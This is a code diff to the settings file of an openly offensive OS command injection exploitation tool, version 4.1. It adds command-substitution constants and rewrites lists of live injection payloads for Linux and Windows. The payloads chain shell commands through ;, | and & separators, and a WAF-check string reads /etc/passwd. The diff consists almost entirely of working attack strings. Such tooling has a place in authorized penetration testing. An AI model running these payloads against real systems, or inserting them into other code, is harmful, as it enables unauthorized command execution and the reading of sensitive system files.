@@ -262,7 +262,7 @@ DESCRIPTION_FULL = "Automated All-in-One OS Command Injection Exploitation Tool"
 DESCRIPTION = "The command injection exploiter"
 AUTHOR  = "Anastasios Stasinopoulos"
 VERSION_NUM = "4.1"
-REVISION = "1"
+REVISION = "2"
 STABLE_RELEASE = False
 VERSION = "v"
 if STABLE_RELEASE:
@@ -329,6 +329,9 @@ USER_DEFINED_PYTHON_INTERPRETER = False
 
 CMD_NUL = ""
 
+CMD_SUB_PREFIX = "$("
+CMD_SUB_SUFFIX = ")"
+
 # Maybe a WAF/IPS protection.
 WAF_CHECK_PAYLOAD = "cat /etc/passwd|uname&&ping -c3 localhost;ls ../"
 WAF_ENABLED = False
@@ -340,14 +343,16 @@ class HEURISTIC_TEST(object):
 RAND_A = random.randint(1,10000)
 RAND_B = random.randint(1,10000)
 CALC_STRING = str(RAND_A) + " %2B " + str(RAND_B)
-BASIC_STRING = "(" + CALC_STRING + ")"
-BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $(" + BASIC_STRING + ")%26echo $(" + BASIC_STRING + ")|echo $(" + BASIC_STRING + ")" + RANDOM_STRING_GENERATOR ,
-                                   "|set /a " + BASIC_STRING + "%26set /a " + BASIC_STRING
-                                   ]
+BASIC_STRING = ""
+BASIC_COMMAND_INJECTION_PAYLOADS = []
 ALTER_SHELL_BASIC_STRING = " -c \"print(int(" + CALC_STRING + "))\""
-ALTER_SHELL_BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")%26echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")|echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")",
-                                   "|for /f \"tokens=*\" %i in ('cmd /c " + WIN_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + "') do @set /p=%i" + CMD_NUL + " &for /f \"tokens=*\" %i in ('cmd /c " + WIN_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + "') do @set /p=%i" + CMD_NUL
-                                   ]
+ALTER_SHELL_BASIC_COMMAND_INJECTION_PAYLOADS = [";echo " + CMD_SUB_PREFIX + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + CMD_SUB_SUFFIX + 
+                                                "%26echo " + CMD_SUB_PREFIX + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + CMD_SUB_SUFFIX + 
+                                                "|echo " + CMD_SUB_PREFIX + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + CMD_SUB_SUFFIX + 
+                                                RANDOM_STRING_GENERATOR,
+                                                "|for /f \"tokens=*\" %i in ('cmd /c " + WIN_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + "') do @set /p=%i" + CMD_NUL + 
+                                                " &for /f \"tokens=*\" %i in ('cmd /c " + WIN_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + "') do @set /p=%i" + CMD_NUL
+                                                ]
 BASIC_COMMAND_INJECTION_RESULT = str(RAND_A + RAND_B)
 IDENTIFIED_COMMAND_INJECTION = False
 
